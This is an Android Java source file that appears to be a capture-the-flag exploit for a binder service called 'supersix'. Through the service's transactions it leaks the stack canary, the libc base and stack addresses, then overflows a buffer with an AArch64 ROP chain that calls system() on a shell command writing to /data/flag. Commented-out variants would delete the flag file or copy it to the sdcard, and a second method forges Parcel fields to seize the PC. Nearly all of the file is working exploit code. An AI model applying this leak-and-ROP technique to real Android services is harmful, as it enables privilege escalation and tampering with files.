package com.hack.nu1lctf;

import android.os.IBinder;
import android.os.Parcel;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.nio.ByteBuffer;

public class MainActivity extends AppCompatActivity {

    // adb install /Users/burningcodes/android_projects/nu1lctf/app/build/outputs/apk/app-debug.apk
    // adb shell am start -n com.hack.nu1lctf/.MainActivity

    private long canary = 0;
    private long str_addr = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        byte[] mm = new byte[100];
        byte[] nn = new byte[1000];
        long libc_base = 0;
        long system_bias = 0x6616c;
        long system_addr = 0;

        for(int i=0;i<100;++i){
            mm[i] = 0x66;
        }
        for(int i=0;i<100;++i){
            nn[i] = 0x66;
        }

        set(0,100,mm);
        //set(1,1000,nn);
        set(2,100,mm);
        set(3,100,mm);
        set(4,100,mm);

        //for(int i=0;i<2;++i)
        libc_base = get(0, 2048);
        system_addr = libc_base + system_bias;
        Log.i("supersix-> system addr:", Long.toHexString(system_addr));

        clear();

        ropchain(libc_base,reverselong(system_addr),reverselong(str_addr));

        //exec(0x9999L,reverselong(system_addr));

    }


    


    // way1
    void ropchain(long libc_addr,long system_addr,long str_addr){

        int i=0;
        byte[] a = new byte[201];
        byte[] b = new byte[5001];


        Log.i("supersix","start~~~~~!");

        // reply 0x7d079ff170
        // buf   0x7d079feec8  680
        // 0x7fd90afb50

        while(i++<200){
            a[i] = 'A';
        }
        i=0;
        while(i++<5000){
            b[i] = 'B';
        }

        int pad = 680 - 4; // buf 2 reply
        byte[] bad = new byte[pad];

        for (i = 0; i < pad; ++i) {
            bad[i] = 0x66;
        }


        // gadget
        // libc.so 0x3ebe4  ->  mov x22,x28; mov x0,x22; mov x1,x26; blr x21

        long gadget = reverselong(libc_addr + 0x3ebe4);

        longToByteArray(reverselong(canary),bad,0x200 - 4); // restore canary
        longToByteArray(str_addr,bad,0x200 + 1*8 - 4); // x28
        longToByteArray(0x2222222222222222L,bad,0x200 + 2*8 - 4); // x27
        longToByteArray(0x3333333333333333L,bad,0x200 + 3*8 - 4); // x26
        longToByteArray(0x4444444444444444L,bad,0x200 + 4*8 - 4); // x25
        longToByteArray(0x5555555555555555L,bad,0x200 + 5*8 - 4); // x24
        longToByteArray(0x6666666666666666L,bad,0x200 + 6*8 - 4); // x23
        longToByteArray(0x1111111111111111L,bad,0x200 + 7*8 - 4); // x22
        longToByteArray(system_addr,bad,0x200 + 8*8 - 4); // x21

        longToByteArray(0x7777777777777777L,bad,0x200 + 11*8 - 4); // x29
        longToByteArray(gadget,bad,0x200 + 12*8 - 4); // pc x30

        longToByteArray(reverselong(canary),bad,0x278 - 4); // restore canary


        longToByteArray(0x6563686f2027746fL,bad,0x278 + 1*8 - 4); // param0 : echo 'to
        longToByteArray(0x6b656e273e2f6461L,bad,0x278 + 2*8 - 4); // param0 : ken'>/da
        longToByteArray(0x74612f666c616700L,bad,0x278 + 3*8 - 4); // param0 : ta/flag


        //longToByteArray(0x726d202f64617461L,bad,0x278 + 1*8 - 4); // param0 : rm /data
        //longToByteArray(0x2f666c6167000000L,bad,0x278 + 2*8 - 4); // param0 : /flag

        //longToByteArray(0x6370202f64617461L,bad,0x278 + 1*8 - 4); // param0 : cp /data
        //longToByteArray(0x2f666c6167202f73L,bad,0x278 + 2*8 - 4); // param0 : flag /sd
        //longToByteArray(0x64636172642f3100L,bad,0x278 + 3*8 - 4); // param0 : card/1
        //longToByteArray(0x6c2f746d702f3100L,bad,0x278 + 4*8 - 4); // param0 : /tmp/1


        set(0,200,a);
        set(1, 5000, b);
        replace(1, pad, bad);

        Log.i("supersix", "end~~~~~");

    }


    /*
    // way2
    void exec(long parm,long pc){

        int i=0;
        byte[] a = new byte[201];
        byte[] b = new byte[5001];


        Log.i("supersix","start~~~~~!");

        // reply 0x7d079ff170
        // buf   0x7d079feec8  680
        // 0x7fd90afb50

        while(i++<200){
            a[i] = 'A';
        }
        i=0;
        while(i++<5000){
            b[i] = 'B';
        }

        int pad = 680 - 4; // buf 2 reply
        byte[] bad = new byte[pad+12*8];

        for (i = 0; i < pad; ++i) {
            bad[i] = 0x66;
        }


        longToByteArray(reverselong(canary),bad,0x200 - 4); // restore canary
        longToByteArray(reverselong(canary),bad,0x278 - 4); // restore canary


        longToByteArray(parm, bad, pad); // mError
        longToByteArray(0L,bad,pad+8*1); // * mData  normal data
        longToByteArray(0L,bad,pad+8*2); // mDataSize
        longToByteArray(0L,bad,pad+8*3); // mDataCapacity
        longToByteArray(0L,bad,pad+8*4); // mDataPos
        longToByteArray(0L,bad,pad+8*5); // mObjects
        longToByteArray(0L,bad,pad+8*6); // mObjectsSize
        longToByteArray(0L, bad, pad + 8 * 7); // mObjectsCapacity
        longToByteArray(0L, bad, pad + 8 * 8); // mNextObjectHint
        longToByteArray(0L, bad, pad + 8 * 9); // mFdsKnown+mHasFds+mAllowFds
        longToByteArray(pc, bad, pad + 8 * 10); // mOwner
        longToByteArray(0L,bad,pad+8*11); // mOwnerCookie


        set(0,200,a);
        set(1, 5000, b);
        replace(1, pad + 12 * 8, bad);

        Log.i("supersix", "end~~~~~");
    }
*/

    void set(int num,int len,byte[] data){

        IBinder ib;
        int ret;
        Parcel p = Parcel.obtain();
        Parcel reply = Parcel.obtain();

        try {

            ib = getServiceBinder("supersix");
            p.writeInterfaceToken("supersixsixsix");
            p.writeInt(num);
            p.writeInt(len);
            p.writeByteArray(data);

            ib.transact(1, p, reply, 0);
            ret = reply.readInt();

        }catch (Exception e){

        }
    }


    long get(int num,int len){

        IBinder ib;
        int ret=-1;
        int tmp0=0,tmp1=0;
        long libc_base = 0;
        long bias = 0x1a598; // some addr at libc
        long leak_addr = 0;
        int canary0=0,canary1=0;
        int stack0=0,stack1=0;

        Parcel p = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        byte[] barray = new byte[10];
        try {

            ib = getServiceBinder("supersix");
            p.writeInterfaceToken("supersixsixsix");
            p.writeInt(num);
            p.writeInt(len);

            Log.i("supersix->", "send");
            ib.transact(2, p, reply, 0);
            reply.readException();


            for(int i=0;i<len/4;++i) {
                int data = reply.readInt();
                Log.i("supersix->", "ret:" + Integer.toString(i) + " " + Integer.toHexString(data));
                if(i == 324)
                    tmp0 = data;
                if(i == 325)
                    tmp1 = data;
                if(i == 128)
                    canary0 = data;
                if(i == 129)
                    canary1 = data;
                if(i == 142)
                    stack0 = data;
                if(i == 143)
                    stack1 = data;

                if(i%200==0)
                    Thread.sleep(500);
            }

            Log.i("supersix->",Long.toHexString((long)tmp1<<32));
            Log.i("supersix->",Long.toHexString((long)tmp0 & 0x00ffffffffL));

            canary = ((((long)canary1)<<32) | (long)canary0 & 0x00ffffffffL ) ;
            leak_addr = ((((long)tmp1)<<32) | (long)tmp0 & 0x00ffffffffL ) ;
            str_addr = ((((long)stack1)<<32) | (long)stack0 & 0x00ffffffffL ) - 0x90 - 4*8 + 7*8 -4*8 +8; // sub a bias
            libc_base = leak_addr - bias;

            Log.i("supersix leak canary->",Long.toHexString(canary));
            Log.i("supersix leak addr->", Long.toHexString(leak_addr));
            Log.i("supersix libc base->",Long.toHexString(libc_base));
            Log.i("supersix stack addr->",Long.toHexString(str_addr));

            return libc_base;

        }catch (Exception e){

            Log.i("supersix-->",e.toString()+" "+e.getMessage().toString());
        }
        return 0;
    }

    int getlen(int num){

        IBinder ib;
        int ret=-1;
        Parcel p = Parcel.obtain();
        Parcel reply = Parcel.obtain();

        try {

            ib = getServiceBinder("supersix");
            p.writeInterfaceToken("supersixsixsix");
            p.writeInt(num);

            ib.transact(3, p, reply, 0);
            ret = reply.readInt();
            return ret;
        }catch (Exception e){

        }
        return -1;
    }

    int replace(int num,int len,byte[] data){

        IBinder ib;
        int ret=-1;
        Parcel p = Parcel.obtain();
        Parcel reply = Parcel.obtain();

        try {

            ib = getServiceBinder("supersix");
            p.writeInterfaceToken("supersixsixsix");
            p.writeInt(num);
            p.writeInt(len);
            p.writeByteArray(data);

            ib.transact(4, p, reply, 0);
            ret = reply.readInt();
            return ret;
        }catch (Exception e){

        }
        return -1;
    }

    void clear(){

        IBinder ib;
        int ret=-1;
        Parcel p = Parcel.obtain();
        Parcel reply = Parcel.obtain();

        try {

            ib = getServiceBinder("supersix");
            p.writeInterfaceToken("supersixsixsix");

            ib.transact(5, p, reply, 0);
            ret = reply.readInt();
        }catch (Exception e){

        }
    }



    static IBinder getServiceBinder(String name) {
        try {
            // return android.os.ServiceManager.getService(name)
            return (IBinder) Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class)
                    .invoke(null, name);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static void longToByteArray(long s,byte[] result,int index) {
        for (int i = 0; i < 8; i++) {
            int offset = (8 - 1 - i) * 8;
            result[index+i] = (byte) ((s >>> offset) & 0xff);
        }
        return ;
    }

    public static long bytesToLong(byte[] bytes) {
        ByteBuffer buffer = ByteBuffer.allocate(8);
        buffer.put(bytes, 0, bytes.length);
        buffer.flip();//need flip
        return buffer.getLong();
    }

    long reverselong(long ll){
        long ret = 0;
        byte[] barray = new byte[8];
        byte tmp;
        longToByteArray(ll,barray,0);
        for(int i=0;i<4;++i){
            tmp = barray[i];
            barray[i] = barray[7-i];
            barray[7-i] = tmp;
        }
        return bytesToLong(barray);
    }

}
